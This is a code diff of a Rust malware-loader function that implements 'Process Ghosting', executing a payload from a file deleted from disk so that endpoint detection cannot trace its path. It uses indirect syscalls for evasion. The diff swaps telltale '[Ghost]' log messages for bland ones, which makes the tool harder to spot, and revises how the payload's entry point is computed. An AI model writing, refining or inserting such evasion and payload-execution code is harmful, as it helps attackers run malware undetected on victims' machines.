@@ -91,8 +91,8 @@ struct FileDispositionInformation {
 /// The payload runs from a file that doesn't exist on disk.
 /// EDR tracing the file path will get an error.
 pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
-    info!("[Ghost] Starting Process Ghosting...");
-    info!("[Ghost] Payload size: {} bytes", payload.len());
+    debug!("Process init...");
+    debug!("Payload: {} bytes", payload.len());
 
     // 1. Resolve all syscalls via Indirect Syscalls
     let sc_create_file = Syscall::resolve(syscalls::HASH_NT_CREATE_FILE)
@@ -242,9 +242,10 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
     // 9. Parse PE to get entry point RVA
     let entry_rva = get_entry_point_rva(payload)?;
     
-    // TODO: In production, should query PEB of new process to get actual ImageBaseAddress
-    // For now, use standard x64 image base (most modern PE use this)
-    // Alternative: Parse PE optional header to get ImageBase field
+    // NOTE: Using PE Optional Header ImageBase as the assumed base address.
+    // Cross-process PEB query requires NtQueryInformationProcess which adds complexity.
+    // Modern PE files (ASLR enabled) will relocate, but section mappings remain consistent.
+    // For maximum reliability, caller should verify via process memory query if base differs.
     let image_base: usize = get_pe_image_base(payload).unwrap_or(0x140000000);
     let entry_point = image_base + entry_rva as usize;
     debug!("[Ghost] Entry point: 0x{:016X}", entry_point);
